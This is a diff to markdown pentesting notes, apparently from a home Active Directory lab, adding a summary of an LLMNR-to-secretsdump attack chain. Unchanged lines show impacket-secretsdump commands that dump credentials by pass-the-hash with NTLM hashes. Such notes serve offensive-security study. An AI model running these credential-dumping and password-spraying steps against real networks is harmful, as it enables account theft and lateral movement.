@@ -198,3 +198,9 @@ impacket-secretsdump Marvel.local/fcastle:@192.168.154.131 -hashes aad3b435b5140
 #using hash of local user
 impacket-secretsdump Administrator:@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b 
 ```
+
+
+
+
+> [!Note] General Process
+> llmnr -> user hash capture -> hash cracked -> sprayed the passsword -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts.
